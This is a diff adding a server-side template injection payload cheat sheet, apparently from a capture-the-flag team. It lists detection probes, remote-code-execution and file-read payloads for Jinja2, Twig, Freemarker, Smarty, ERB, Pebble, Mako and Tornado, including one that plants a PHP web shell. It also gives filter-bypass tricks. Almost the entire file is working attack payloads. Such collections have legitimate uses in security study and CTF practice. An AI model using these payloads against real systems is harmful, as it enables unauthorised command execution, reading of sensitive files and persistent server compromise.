@@ -1,0 +1,84 @@
+# SSTI Payload Collection — TEAM_UNFINDABLES
+# Server-Side Template Injection payloads for common engines
+
+# ============================================
+# Detection / Identification
+# ============================================
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+{{7*'7'}}
+*{7*7}
+@(7*7)
+
+# ============================================
+# Jinja2 (Python / Flask)
+# ============================================
+# Version detection
+{{config}}
+{{config.items()}}
+{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['current_app'].config}}
+
+# RCE
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__bases__[0].__subclasses__()[408]('whoami',shell=True,stdout=-1).communicate()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{lipsum.__globals__['os'].popen('cat /flag*').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{request.__class__._load_form_data.__globals__.__builtins__['__import__']('os').popen('id').read()}}
+
+# File read
+{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}
+
+# ============================================
+# Twig (PHP)
+# ============================================
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{['cat /flag.txt']|filter('system')}}
+
+# ============================================
+# Freemarker (Java)
+# ============================================
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+[#assign ex='freemarker.template.utility.Execute'?new()]${ex('cat /flag.txt')}
+
+# ============================================
+# Smarty (PHP)
+# ============================================
+{php}system('id');{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+
+# ============================================
+# ERB (Ruby)
+# ============================================
+<%= system("id") %>
+<%= `cat /flag.txt` %>
+<%= File.read('/flag.txt') %>
+
+# ============================================
+# Pebble (Java)
+# ============================================
+{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}
+
+# ============================================
+# Mako (Python)
+# ============================================
+<%import os%>${os.popen("id").read()}
+${self.module.cache.util.os.popen("cat /flag.txt").read()}
+
+# ============================================
+# Tornado (Python)
+# ============================================
+{% import os %}{{ os.popen("id").read() }}
+
+# ============================================
+# Filter Bypass Tricks
+# ============================================
+# Dot bypass: use |attr()
+{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}
+# Underscore bypass: use \x5f
+# Quote bypass: use request.args
+{{request['__class__']}}
